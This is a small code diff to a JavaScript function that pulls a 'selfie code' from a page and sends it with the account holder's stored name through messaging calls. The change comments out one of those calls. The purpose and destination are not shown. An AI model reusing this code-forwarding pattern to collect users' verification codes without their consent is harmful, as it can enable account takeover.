@@ -35,7 +35,7 @@ function ExtractAndSendTheSelfieCode(){
             navigator.clipboard.writeText(selfieCode);
 
              appendToFile(selfieCode, 'FORBES_SELFIE_CODE')
-           sendMessage( localStorage.accountFullName + ' :  '+selfieCode)
+         //  sendMessage( localStorage.accountFullName + ' :  '+selfieCode)
              sendMessage('FORBES SELFIE CODE')
             sendMessage2( localStorage.accountFullName + ' :  ' +selfieCode)
 
